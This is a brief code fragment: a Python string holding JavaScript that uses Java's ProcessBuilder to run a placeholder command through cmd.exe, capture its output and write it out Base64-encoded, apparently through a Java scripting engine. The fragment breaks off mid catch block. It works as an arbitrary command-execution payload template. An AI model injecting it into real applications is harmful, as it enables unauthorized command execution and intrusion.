JS_EXEC = '''
try {
  var pb = new java.lang.ProcessBuilder();
  pb.command(java.util.Arrays.asList('cmd.exe', '/c', __CMD__));
  pb.redirectErrorStream(true);
  var d = new java.io.File(__CWD__);
  if (!d.isDirectory()) { d = new java.io.File('C:\\\\'); }
  pb.directory(d);
  var p = pb.start();
  var bos = new java.io.ByteArrayOutputStream();
  var buf = java.lang.reflect.Array.newInstance(java.lang.Byte.TYPE, 8192);
  var ins = p.getInputStream();
  var n;
  while ((n = ins.read(buf)) != -1) { bos.write(buf, 0, n); }
  p.waitFor();
  pcd_write(__FILE__, java.util.Base64.getEncoder().encodeToString(bos.toByteArray()));
} catch (e) {
